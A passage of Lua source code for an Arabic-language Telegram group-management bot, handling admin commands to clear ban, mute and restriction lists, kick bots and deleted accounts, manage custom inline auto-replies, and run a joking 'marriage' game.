return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المتوحدين *","md",true)
end
if TextMsg == 'الوتكات' then
local Info_Members = Redis:smembers(darket.."wtka:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد وتكات حاليا , ","md",true)  
end
Redis:del(darket.."wtka:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من الوتكات *","md",true)
end
----تسلية----
if TextMsg == 'المحظورين عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين عام حاليا , ","md",true)  
end
Redis:del(darket.."BanAll:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المحظورين عام *","md",true)
end
if TextMsg == 'المكتومين عام' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanAll:Groups") 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مكتومين عام حاليا , ","md",true)  
end
Redis:del(darket.."ktmAll:Groups") 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المكتومين عام *","md",true)
end
if TextMsg == 'المحظورين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."BanGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد محظورين حاليا , ","md",true)  
end
Redis:del(darket.."BanGroup:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المحظورين *","md",true)
end
if TextMsg == 'المكتومين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(darket.."SilentGroup:Group"..msg_chat_id) 
if #Info_Members == 0 then
return send(msg_chat_id,msg_id,"٠ لا يوجد مكتومين حاليا , ","md",true)  
end
Redis:del(darket.."SilentGroup:Group"..msg_chat_id) 
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..#Info_Members.."} من المكتومين *","md",true)
end
if TextMsg == 'المقيدين' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Recent", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.is_member == true and Info_Members.members[k].status.luatele == "chatMemberStatusRestricted" then
LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'restricted',{1,1,1,1,1,1,1,1})
x = x + 1
end
end
return send(msg_chat_id,msg_id,"*٠ تم مسح {"..x.."} من المقيديين *","md",true)
end
if TextMsg == 'البوتات' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Bots", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
local Ban_Bots = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
if Ban_Bots.luatele == "ok" then
x = x + 1
end
end
return send(msg_chat_id,msg_id,"\n*٠عدد البوتات الموجوده : "..#List_Members.."\n٠ تم طرد ( "..x.." ) بوت من الكروب *","md",true)  
end
if TextMsg == 'المطرودين' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.getSupergroupMembers(msg_chat_id, "Banned", "*", 0, 200)
x = 0
local List_Members = Info_Members.members
for k, v in pairs(List_Members) do
UNBan_Bots = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'restricted',{1,1,1,1,1,1,1,1,1})
if UNBan_Bots.luatele == "ok" then
x = x + 1
end
end
return send(msg_chat_id,msg_id,"\n*٠عدد المطرودين في الكروب : "..#List_Members.."\n٠ تم الغاء الحظر عن ( "..x.." ) من الاشخاص*","md",true)  
end
if TextMsg == 'المحذوفين' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
local List_Members = Info_Members.members
x = 0
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.type.luatele == "userTypeDeleted" then
local userTypeDeleted = LuaTele.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
if userTypeDeleted.luatele == "ok" then
x = x + 1
end
end
end
return send(msg_chat_id,msg_id,"\n*٠ تم طرد ( "..x.." ) حساب محذوف *","md",true)  
end
end


if text == "اضف رد" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
Redis:set(darket.."Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,true)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
},
}
}
return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود ","md",false, false, false, false, reply_markup)
end
if text == ("مسح الردود") then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Manager"..msg_chat_id.."")
for k,v in pairs(list) do
Redis:del(darket.."Add:Rd:Manager:Gif"..v..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Vico"..v..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Stekrs"..v..msg_chat_id)     
Redis:del(darket.."Add:Rd:Manager:Text"..v..msg_chat_id)   
Redis:del(darket.."Add:Rd:Manager:Photo"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Photoc"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Video"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Videoc"..v..msg_chat_id)  
Redis:del(darket.."Add:Rd:Manager:File"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:video_note"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audio"..v..msg_chat_id)
Redis:del(darket.."Add:Rd:Manager:Audioc"..v..msg_chat_id)
Redis:del(darket.."List:Manager"..msg_chat_id.."")
end
return send(msg_chat_id,msg_id,"٠ تم مسح قائمه الردود","md",true)  
end

-- sex
if text == ("مسح الردود الانلاين") then
  if not msg.Manger then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local list = Redis:smembers(darket.."List:Manager:inline"..msg_chat_id.."")
  for k,v in pairs(list) do
      Redis:del(darket.."Add:Rd:Manager:Gif:inline"..v..msg_chat_id)   
      Redis:del(darket.."Add:Rd:Manager:Vico:inline"..v..msg_chat_id)   
      Redis:del(darket.."Add:Rd:Manager:Stekrs:inline"..v..msg_chat_id)     
      Redis:del(darket.."Add:Rd:Manager:Text:inline"..v..msg_chat_id)   
      Redis:del(darket.."Add:Rd:Manager:Photo:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:Photoc:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:Video:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:Videoc:inline"..v..msg_chat_id)  
      Redis:del(darket.."Add:Rd:Manager:File:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:video_note:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:Audio:inline"..v..msg_chat_id)
      Redis:del(darket.."Add:Rd:Manager:Audioc:inline"..v..msg_chat_id)
      Redis:del(darket.."Rd:Manager:inline:v"..v..msg_chat_id)
      Redis:del(darket.."Rd:Manager:inline:link"..v..msg_chat_id)
  Redis:del(darket.."List:Manager:inline"..msg_chat_id)
  end
  return send(msg_chat_id,msg_id,"٠ تم مسح قائمه الانلاين","md",true)  
  end
if text == "اضف رد انلاين" then
  if not msg.Admin then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
  end
    Redis:set(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id,true)
  local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
  },
  }
  }
  return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لاضافتها في الردود ","md",false, false, false, false, reply_markup)
end
if text and text:match("^(.*)$") and tonumber(msg.sender.user_id) ~= tonumber(darket) then
  if Redis:get(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id) == "true" then
  Redis:set(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id,"true1")
  Redis:set(darket.."Text:Manager:inline"..msg.sender.user_id..":"..msg_chat_id, text)
  Redis:del(darket.."Add:Rd:Manager:Gif:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Vico:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Stekrs:inline"..text..msg_chat_id)     
  Redis:del(darket.."Add:Rd:Manager:Text:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Photo:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Photoc:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Video:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Videoc:inline"..text..msg_chat_id)  
  Redis:del(darket.."Add:Rd:Manager:File:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:video_note:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Audio:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Audioc:inline"..text..msg_chat_id)
  Redis:del(darket.."Rd:Manager:inline:text"..text..msg_chat_id)
  Redis:del(darket.."Rd:Manager:inline:link"..text..msg_chat_id)
  Redis:sadd(darket.."List:Manager:inline"..msg_chat_id.."", text)
  send(msg_chat_id,msg_id,[[
  ↯︙ارسل لي الرد سواء كان 
  ❨ ملف ، ملصق ، متحركه ، صوره
   ، فيديو ، بصمه الفيديو ، بصمه ، صوت ، رساله ❩
  ↯︙يمكنك اضافة الى النص ٠
  – – – – – – – –
   `#username` ↬ معرف المستخدم
   `#msgs` ↬ عدد الرسائل
   `#name` ↬ اسم المستخدم
   `#id` ↬ ايدي المستخدم
   `#stast` ↬ رتبة المستخدم
   `#edit` ↬ عدد التعديلات
  
  ]],"md",true)  
  return false
  end
  end
if text and text:match("^(.*)$") then
if Redis:get(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id.."") == "true2" then
  Redis:del(darket.."Add:Rd:Manager:Gif:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Vico:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Stekrs:inline"..text..msg_chat_id)     
  Redis:del(darket.."Add:Rd:Manager:Text:inline"..text..msg_chat_id)   
  Redis:del(darket.."Add:Rd:Manager:Photo:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Photoc:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Video:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Videoc:inline"..text..msg_chat_id)  
  Redis:del(darket.."Add:Rd:Manager:File:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:video_note:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Audio:inline"..text..msg_chat_id)
  Redis:del(darket.."Add:Rd:Manager:Audioc:inline"..text..msg_chat_id)
  Redis:del(darket.."Rd:Manager:inline:text"..text..msg_chat_id)
  Redis:del(darket.."Rd:Manager:inline:link"..text..msg_chat_id)
Redis:del(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id.."")
Redis:srem(darket.."List:Manager:inline"..msg_chat_id.."", text)
send(msg_chat_id,msg_id,"٠ تم حذف الرد من الردود الانلاين ","md",true)  
return false
end
end
if Redis:get(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id) == "true1" and tonumber(msg.sender.user_id) ~= tonumber(darket) then
Redis:del(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id)
Redis:set(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id,"set_inline")
if text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then
local anubis = Redis:get(darket.."Text:Manager:inline"..msg.sender.user_id..":"..msg_chat_id)
if msg.content.text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
Redis:set(darket.."Add:Rd:Manager:Text:inline"..anubis..msg_chat_id, text)
elseif msg.content.sticker then   
Redis:set(darket.."Add:Rd:Manager:Stekrs:inline"..anubis..msg_chat_id, msg.content.sticker.sticker.remote.id)  
elseif msg.content.voice_note then  
Redis:set(darket.."Add:Rd:Manager:Vico:inline"..anubis..msg_chat_id, msg.content.voice_note.voice.remote.id)  
elseif msg.content.audio then
Redis:set(darket.."Add:Rd:Manager:Audio:inline"..anubis..msg_chat_id, msg.content.audio.audio.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Audioc:inline"..anubis..msg_chat_id, msg.content.caption.text)  
elseif msg.content.document then
Redis:set(darket.."Add:Rd:Manager:File:inline"..anubis..msg_chat_id, msg.content.document.document.remote.id)  
elseif msg.content.animation then
Redis:set(darket.."Add:Rd:Manager:Gif:inline"..anubis..msg_chat_id, msg.content.animation.animation.remote.id)  
elseif msg.content.video_note then
Redis:set(darket.."Add:Rd:Manager:video_note:inline"..anubis..msg_chat_id, msg.content.video_note.video.remote.id)  
elseif msg.content.video then
Redis:set(darket.."Add:Rd:Manager:Video:inline"..anubis..msg_chat_id, msg.content.video.video.remote.id)  
Redis:set(darket.."Add:Rd:Manager:Videoc:inline"..anubis..msg_chat_id, msg.content.caption.text)  
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
Redis:set(darket.."Add:Rd:Manager:Photo:inline"..anubis..msg_chat_id, idPhoto)  
Redis:set(darket.."Add:Rd:Manager:Photoc:inline"..anubis..msg_chat_id, msg.content.caption.text)  
end
send(msg_chat_id,msg_id,"٠ الان ارسل الكلام داخل الزر","md",true)  
return false  
end  
end
if text and Redis:get(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id) == "set_inline" then
Redis:set(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id, "set_link")
local anubis = Redis:get(darket.."Text:Manager:inline"..msg.sender.user_id..":"..msg_chat_id)
Redis:set(darket.."Rd:Manager:inline:text"..anubis..msg_chat_id, text)
send(msg_chat_id,msg_id,"٠ الان ارسل الرابط","md",true)  
return false  
end
if text and Redis:get(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id) == "set_link" then
Redis:del(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id)
local anubis = Redis:get(darket.."Text:Manager:inline"..msg.sender.user_id..":"..msg_chat_id)
Redis:set(darket.."Rd:Manager:inline:link"..anubis..msg_chat_id, text)
send(msg_chat_id,msg_id,"٠ تم اضافه الرد بنجاح","md",true)  
return false  
end
if text and not Redis:get(darket.."Status:Reply:inline"..msg_chat_id) then
local btext = Redis:get(darket.."Rd:Manager:inline:text"..text..msg_chat_id)
local blink = Redis:get(darket.."Rd:Manager:inline:link"..text..msg_chat_id)
local anemi = Redis:get(darket.."Add:Rd:Manager:Gif:inline"..text..msg_chat_id)   
local veico = Redis:get(darket.."Add:Rd:Manager:Vico:inline"..text..msg_chat_id)   
local stekr = Redis:get(darket.."Add:Rd:Manager:Stekrs:inline"..text..msg_chat_id)     
local Texingt = Redis:get(darket.."Add:Rd:Manager:Text:inline"..text..msg_chat_id)   
local photo = Redis:get(darket.."Add:Rd:Manager:Photo:inline"..text..msg_chat_id)
local photoc = Redis:get(darket.."Add:Rd:Manager:Photoc:inline"..text..msg_chat_id)
local video = Redis:get(darket.."Add:Rd:Manager:Video:inline"..text..msg_chat_id)
local videoc = Redis:get(darket.."Add:Rd:Manager:Videoc:inline"..text..msg_chat_id)  
local document = Redis:get(darket.."Add:Rd:Manager:File:inline"..text..msg_chat_id)
local audio = Redis:get(darket.."Add:Rd:Manager:Audio:inline"..text..msg_chat_id)
local audioc = Redis:get(darket.."Add:Rd:Manager:Audioc:inline"..text..msg_chat_id)
local video_note = Redis:get(darket.."Add:Rd:Manager:video_note:inline"..text..msg_chat_id)
local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = btext , url = blink},
  },
  }
  }
if Texingt then 
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local NumMsg = Redis:get(darket..'Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
local TotalMsg = Total_message(NumMsg) 
local Status_Gps = msg.Name_Controller
local NumMessageEdit = Redis:get(darket..'Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
local Texingt = Texingt:gsub('#name',UserInfo.first_name)
local Texingt = Texingt:gsub('#id',msg.sender.user_id)
local Texingt = Texingt:gsub('#edit',NumMessageEdit)
local Texingt = Texingt:gsub('#msgs',NumMsg)
local Texingt = Texingt:gsub('#stast',Status_Gps)
send(msg_chat_id,msg_id,'['..Texingt..']',"md",false, false, false, false, reply_markup)  
end
if video_note then
LuaTele.sendVideoNote(msg_chat_id, msg.id, video_note, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
if photo then
LuaTele.sendPhoto(msg.chat_id, msg.id, photo,photoc,"md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
end  
if stekr then 
LuaTele.sendSticker(msg_chat_id, msg.id, stekr,nil,nil,nil,nil,nil,nil,nil,reply_markup)
end
if veico then 
LuaTele.sendVoiceNote(msg_chat_id, msg.id, veico, '', 'md',nil, nil, nil, nil, reply_markup)
end
if video then 
LuaTele.sendVideo(msg_chat_id, msg.id, video, videoc, "md", true, nil, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
if anemi then 
LuaTele.sendAnimation(msg_chat_id,msg.id, anemi, '', 'md', nil, nil, nil, nil, nil, nil, nil, nil,reply_markup)
end
if document then
LuaTele.sendDocument(msg_chat_id, msg.id, document, '', 'md',nil, nil, nil, nil,nil, reply_markup)
end  
if audio then
LuaTele.sendAudio(msg_chat_id, msg.id, audio, audioc, "md", nil, nil, nil, nil, nil, nil, nil, nil,reply_markup) 
end
end
if text == "حذف رد انلاين" then
  if not msg.Admin then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local reply_markup = LuaTele.replyMarkup{
  type = 'inline',
  data = {
  {
  {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelrdd'},
  },
  }
  }
  Redis:set(darket.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg_chat_id,"true2")
  return send(msg_chat_id,msg_id,"٠ ارسل الان الكلمه لحذفها من الردود الانلاين","md",false, false, false, false, reply_markup)
  end 

if text == ("الردود الانلاين") then
  if not msg.Manger then
  return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
  end
  if ChannelJoin(msg) == false then
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
  return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
  end
  local list = Redis:smembers(darket.."List:Manager:inline"..msg_chat_id.."")
  text = "٠ قائمه الردود الانلاين \n– – – – – – – –\n"
  for k,v in pairs(list) do
  if Redis:get(darket.."Add:Rd:Manager:Gif:inline"..v..msg_chat_id) then
  db = "متحركه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Vico:inline"..v..msg_chat_id) then
  db = "بصمه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Stekrs:inline"..v..msg_chat_id) then
  db = "ملصق ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Text:inline"..v..msg_chat_id) then
  db = "رساله ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Photo:inline"..v..msg_chat_id) then
  db = "صوره ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Video:inline"..v..msg_chat_id) then
  db = "فيديو ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:File:inline"..v..msg_chat_id) then
  db = "ملف ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:Audio:inline"..v..msg_chat_id) then
  db = "اغنيه ٠"
  elseif Redis:get(darket.."Add:Rd:Manager:video_note:inline"..v..msg_chat_id) then
  db = "بصمه فيديو ٠"
  end
  text = text..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
  end
  if #list == 0 then
  text = "٠ عذرا لا يوجد ردود انلاين في الكروب"
  end
  return send(msg_chat_id,msg_id,"["..text.."]","md",true)  
  end
-- zwag 
if text == "زواج" or text == "رفع زوجتي" or text == "رفع زوجي" and msg.reply_to_message_id ~= 0 then
  local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
  local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
  if tonumber(Message_Reply.sender.user_id) == tonumber(msg.sender.user_id) then
    return send(msg_chat_id,msg_id,"انت اهبل يبني عاوز تتزوج نفسك ؟ هتتكاثر ازاي طيب ؟!!","md",true)  
  end
  if tonumber(Message_Reply.sender.user_id) == tonumber(darket) then
    return send(msg_chat_id,msg_id,"ابعد عني يحيحان ملكقتش غيري","md",true)  
  end
  if Redis:sismember(darket..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) then
    local rd_mtzwga = {
      "اسف يكلبي متزوجه",
      "متزوجه يبن عمي شفلك واحده تانيه",
      "يبني متزوجه ازوجهاشلك ازاي انا",
      "للاسف متزوجه بس  لو العمليه جايبه اخرها شوف واحده تانيه",
      "يادي الكسفه طلعت متزوجه قبلك"
    }
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_mtzwga[math.random(#rd_mtzwga)]).Reply,"md",true)  
    else
      local rd_zwag = {
        "تم زواجك منه وبارك الله لكم وعليكم",
        "لولولولويي تم الزواج عقبال العيال بقا",
        "مبروك اتزوجتها عاوز اتغدا بقا في الفرح",
        "تم زواجكم... ودا رقمي عشان لو العريس معرفش يسد 012345..",
        "الزواج تم اتفضلو اعملو احلا واحد بقا هيهيهي"
      }
    if Redis:sismember(darket..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id) then 
    Redis:srem(darket..msg_chat_id.."mutlqat:",Message_Reply.sender.user_id)
    end
    Redis:sadd(darket..msg_chat_id.."zwgat:",Message_Reply.sender.user_id) 
    return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,rd_zwag[math.random(#rd_zwag)]).Reply,"md",true)  
    end
end
if text == "تاك للزوجات" or text == "الزوجات" then
  local zwgat_list = Redis:smembers(darket..msg_chat_id.."zwgat:")
  if #zwgat_list == 0 then 
    return send(msg_chat_id,msg_id,'٠ لايوجد زوجات',"md",true) 
  end 
  local zwga_list = "٠ عدد الزوجات : "..#zwgat_list.."\n٠ الزوجات :\n– – – – – – – –\n"
  for k, v in pairs(zwgat_list) do
    local UserInfo = LuaTele.getUser(v)
